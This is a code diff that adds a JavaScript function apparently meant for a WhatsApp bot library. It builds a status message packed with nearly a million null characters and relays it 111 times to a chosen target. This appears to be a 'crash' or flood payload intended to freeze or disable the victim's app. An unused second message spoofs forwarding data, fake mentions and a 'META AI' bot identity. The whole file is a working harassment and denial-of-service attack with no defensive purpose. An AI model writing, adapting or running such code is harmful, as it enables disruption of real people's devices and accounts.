@@ -1,0 +1,59 @@
+async function AxDLotus(sock, target) {
+  const Mbape = ["address_message", "call_permission_request", "galaxy_message", "menu_options"]
+  
+  const msg1 = {
+    viewOnceMessage: {
+      message: {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {
+              nativeFlowResponseMessage: {
+                name: Mbape[0],
+                paramsJson: `{"display_text":"${"\u0000".repeat(900000)}","description":"${"\u0000".repeat(90000)}","id":"AXD"}`,
+                version: 3
+              },
+              entryPointConversionSource: Mbape.join(",")
+            }
+          }
+        }
+      }
+    }
+  }
+  
+  const msg2 = {
+    interactiveMessage: {
+                    contextInfo: {
+                        stanzaId: "Mbape.id.com" + Date.now(),
+                        isForwarding: true,
+                        forwardingScore: 999,
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        mentionedJid: [
+                            "13333335502@s.whatsapp.net",
+                            ...Array.from(
+                                { length: 5 }, () => 
+                                    "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net",
+                            ),
+                        ],
+                        quotedMessage: {
+                            paymentInviteMessage: {
+                                serviceType: 3,
+                                expiryTimeStamp: Date.now() + 18144000000,
+                            },
+                        },
+                        forwardedAiBotMessageInfo: {
+                            botName: "META AI",
+                            botJid: Math.floor(Math.random() * 99999),
+                            creatorName: "Mbape.net",
+                        },
+                        hasMediaAttachment: false
+                    },
+               },
+            }
+
+  for (let i = 0; i < 111; i++) {
+    await sock.relayMessage(target, msg1, {
+      messageId: sock.generateMessageTag()
+    })
+  }
+}
